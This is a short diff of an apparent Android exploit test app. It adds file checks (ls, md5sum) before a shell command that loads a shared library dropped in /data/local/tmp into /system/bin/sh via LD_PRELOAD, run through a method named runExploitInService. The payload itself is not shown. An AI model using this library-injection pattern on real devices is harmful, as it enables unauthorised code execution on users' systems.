@@ -155,7 +155,10 @@ public class MainActivity extends Activity {
             }
             log("已读取: " + soBytes.length + " 字节");
             String dst = "/data/local/tmp/preload.so";
-            String cmd = "LD_PRELOAD=" + dst + " /system/bin/sh -c 'echo exploit_triggered'";
+            // 先检查文件状态,再执行 LD_PRELOAD
+            String cmd = "ls -l " + dst + " && md5sum " + dst
+                    + " && echo '--- LD_PRELOAD ---' && LD_PRELOAD=" + dst
+                    + " /system/bin/sh -c 'echo exploit_triggered'";
             log("正在运行: " + cmd);
             runExploitInService(dst, soBytes, cmd);
         } catch (Exception e) {
